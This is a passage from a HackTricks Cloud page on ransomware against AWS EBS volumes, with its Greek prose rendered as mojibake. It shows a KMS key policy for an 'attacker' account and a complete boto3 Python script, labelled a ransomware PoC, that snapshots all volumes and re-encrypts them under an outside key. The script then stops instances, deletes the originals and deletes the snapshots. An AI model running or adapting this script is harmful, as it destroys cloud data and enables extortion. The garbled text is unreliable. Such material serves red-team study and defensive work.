ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Ï‰Î½ EBS volumes. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Î‘Ï…Ï„ÏŒ Î­Ï‡ÎµÎ¹ Ï‰Ï‚ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Î½Î± Ï€Î±ÏÎ±Î¼Î­Î½Î¿Ï…Î½ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î± ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Î¼ÏŒÎ½Î¿ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î± EBS volumes.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Î•Ï€Î¯ÏƒÎ·Ï‚ Î±Î¾Î¯Î¶ÎµÎ¹ Î½Î± ÏƒÎ·Î¼ÎµÎ¹Ï‰Î¸ÎµÎ¯, Ï„Î¿ script ÏƒÏ„Î±Î¼Î¬Ï„Î·ÏƒÎµ Ï„Î¹Ï‚ EC2 instances Î³Î¹Î± Î½Î± Î±Ï€Î¿ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹ ÎºÎ±Î¹ Î½Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î± Î±ÏÏ‡Î¹ÎºÎ¬ EBS volumes. Î¤Î± Î±ÏÏ‡Î¹ÎºÎ¬ Î¼Î· ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î± volumes Î­Ï‡Î¿Ï…Î½ Ï€Î»Î­Î¿Î½ ÎµÎ¾Î±Ï†Î±Î½Î¹ÏƒÏ„ÎµÎ¯.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÏ„Îµ ÏƒÏ„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ 'attacker' ÎºÎ±Î¹ Î±Ï†Î±Î¹ÏÎ­ÏƒÏ„Îµ Ï„Î¿Î½ ÎºÎ±Î½ÏŒÎ½Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ 'Outside Encryption' Î±Ï€ÏŒ Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Î ÎµÏÎ¹Î¼Î­Î½ÎµÏ„Îµ Î»Î¯Î³Î¿ Î³Î¹Î± Î½Î± Î´Î¹Î±Î´Î¿Î¸ÎµÎ¯ Î· Î½Î­Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÏ„Îµ ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ 'victim' ÎºÎ±Î¹ Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÏ„Îµ Î½Î± ÏƒÏ…Î½Î´Î­ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Î½ÎµÎ¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿Ï…Ï‚ EBS volumes. Î˜Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÏÏƒÎµÏ„Îµ ÏŒÏ„Î¹ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ…Î½Î´Î­ÏƒÎµÏ„Îµ Ï„Î¿Î½ volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Î‘Î»Î»Î¬ ÏŒÏ„Î±Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ Î¾Î±Î½Î¬ Ï„Î¿ EC2 instance Î¼Îµ Ï„Î¿Î½ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿ EBS volume, Î¸Î± Î±Ï€Î¿Ï„ÏÏ‡ÎµÎ¹ ÎºÎ±Î¹ Î¸Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯ Î±Ï€ÏŒ Ï„Î·Î½ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· 'pending' Ï€Î¯ÏƒÏ‰ ÏƒÏ„Î·Î½ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· 'stopped' Î³Î¹Î± Ï€Î¬Î½Ï„Î±, ÎºÎ±Î¸ÏÏ‚ Î¿ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï‚ EBS volume Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¸ÎµÎ¯ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯, Î±Ï†Î¿Ï Î· Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Î´ÎµÎ½ Ï„Î¿ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï€Î»Î­Î¿Î½.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ python script Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹. Î›Î±Î¼Î²Î¬Î½ÎµÎ¹ AWS creds Î³Î¹Î± Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ 'victim' ÎºÎ±Î¹ Î¼Î¹Î± Î´Î·Î¼ÏŒÏƒÎ¹Î± Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· AWS ARN Ï„Î¹Î¼Î® Î³Î¹Î± Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï€Î¿Ï… Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·. Î¤Î¿ script Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î± Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î± ÎŸÎ›Î©Î Ï„Ï‰Î½ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Ï‰Î½ EBS volumes Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î± ÏƒÎµ ÎŸÎ›Î‘ Ï„Î± EC2 instances ÏƒÏ„Î¿Î½ ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î¿ AWS Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ, ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î¸Î± ÏƒÏ„Î±Î¼Î±Ï„Î®ÏƒÎµÎ¹ ÎºÎ¬Î¸Îµ EC2 instance, Î¸Î± Î±Ï€Î¿ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹ Ï„Î¿Ï…Ï‚ Î±ÏÏ‡Î¹ÎºÎ¿ÏÏ‚ EBS volumes, Î¸Î± Ï„Î¿Ï…Ï‚ Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ ÎºÎ±Î¹ Ï„ÎµÎ»Î¹ÎºÎ¬ Î¸Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ ÏŒÎ»Î± Ï„Î± snapshots Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎ±Î½ ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±. Î‘Ï…Ï„ÏŒ Î¸Î± Î±Ï†Î®ÏƒÎµÎ¹ Î¼ÏŒÎ½Î¿ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿Ï…Ï‚ EBS volumes ÏƒÏ„Î¿Î½ ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ 'victim'. Î§Î¡Î—Î£Î™ÎœÎŸÎ ÎŸÎ™Î—Î£Î¤Î• Î‘Î¥Î¤ÎŸ Î¤ÎŸ SCRIPT ÎœÎŸÎÎŸ Î£Î• Î Î•Î¡Î™Î’Î‘Î›Î›ÎŸÎ Î”ÎŸÎšÎ™ÎœÎ©Î, Î•Î™ÎÎ‘Î™ ÎšÎ‘Î¤Î‘Î£Î¤Î¡ÎŸÎ¦Î™ÎšÎŸ ÎšÎ‘Î™ Î˜Î‘ Î”Î™Î‘Î“Î¡Î‘Î¨Î•Î™ ÎŸÎ›ÎŸÎ¥Î£ Î¤ÎŸÎ¥Î£ Î‘Î¡Î§Î™ÎšÎŸÎ¥Î£ EBS VOLUMES. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿Ï…Ï‚ Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ KMS key ÎºÎ±Î¹ Î½Î± Ï„Î¿Ï…Ï‚ ÎµÏ€Î±Î½Î±Ï†Î­ÏÎµÏ„Îµ ÏƒÏ„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Ï„Î¿Ï…Ï‚ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Î¼Î­ÏƒÏ‰ snapshots, Î±Î»Î»Î¬ Î¸Î­Î»Ï‰ Î±Ï€Î»ÏÏ‚ Î½Î± ÏƒÎ±Ï‚ ÎµÎ½Î·Î¼ÎµÏÏÏƒÏ‰ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ransomware PoC ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚ Ï„Î·Ï‚ Î·Î¼Î­ÏÎ±Ï‚.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î”ÎµÎ¯Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î“Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î·Ï‚** ğŸ’¬ [**Î¿Î¼Î¬Î´Î±Ï‚ Discord**](https://discord.gg/hRep4RUj7f) Î® Ï„Î·Ï‚ [**Î¿Î¼Î¬Î´Î±Ï‚ telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}
